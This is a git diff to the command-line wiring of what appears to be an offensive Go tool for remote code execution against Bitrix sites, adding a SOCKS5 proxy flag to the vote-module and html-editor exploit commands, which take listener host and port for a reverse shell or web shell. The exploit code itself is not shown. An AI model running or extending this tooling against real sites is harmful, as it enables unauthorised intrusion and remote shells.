@@ -1,10 +1,10 @@
 package cmd
 
 import (
-	"github.com/spf13/cobra"
-	"github.com/indigo-sadland/quick-tricks/modules/rce/va"
 	"github.com/indigo-sadland/quick-tricks/modules/rce/he"
+	"github.com/indigo-sadland/quick-tricks/modules/rce/va"
 	"github.com/indigo-sadland/quick-tricks/utils/colors"
+	"github.com/spf13/cobra"
 )
 
 // rceCmd represents the rce command
@@ -26,7 +26,8 @@ var voteCmd = &cobra.Command{
 		lhost, _ := cmd.Flags().GetString("lhost")
 		lport, _ := cmd.Flags().GetString("lport")
 		agentId, _ := cmd.Flags().GetString("agentId")
-		err := va.Exploit(target, lhost, lport, agentId, webshell)
+		proxy, _ := cmd.Flags().GetString("proxy")
+		err := va.Exploit(target, lhost, lport, agentId, proxy, webshell)
 		if err != nil {
 			colors.BAD.Println(err)
 		}
@@ -39,7 +40,8 @@ var editorCmd = &cobra.Command{
 	Short: "(NOT IMPLEMENTED) Exploit RCE via html editor (Bitrix <= 20.100.0).",
 	Run: func(cmd *cobra.Command, args []string) {
 		target, _ := cmd.Flags().GetString("url")
-		err := he.Exploit(target)
+		proxy, _ := cmd.Flags().GetString("proxy")
+		err := he.Exploit(target, proxy)
 		if err != nil {
 			colors.BAD.Println(err)
 		}
@@ -60,6 +62,7 @@ func init() {
 	voteCmd.MarkFlagRequired("lport")
 	voteCmd.Flags().String("agentId", "4", "ID of vote module agent (2,4 and 7 are available)")
 	voteCmd.Flags().Bool("web-shell", false, "Use web shell instead of console reverse shell.")
+	voteCmd.Flags().String("proxy", "", "socks5 proxy to use. Example: socks5://IP:PORT")
 
 	editorCmd.PersistentFlags().StringP("url", "u", "", "Target Bitrix site")
 	editorCmd.MarkFlagRequired("url")
@@ -67,4 +70,5 @@ func init() {
 	editorCmd.MarkFlagRequired("lhost")
 	editorCmd.PersistentFlags().String("lport", "", "Port of the host that listens for reverse connection")
 	editorCmd.MarkFlagRequired("lport")
+	editorCmd.Flags().String("proxy", "", "socks5 proxy to use. Example: socks5://IP:PORT")
 }
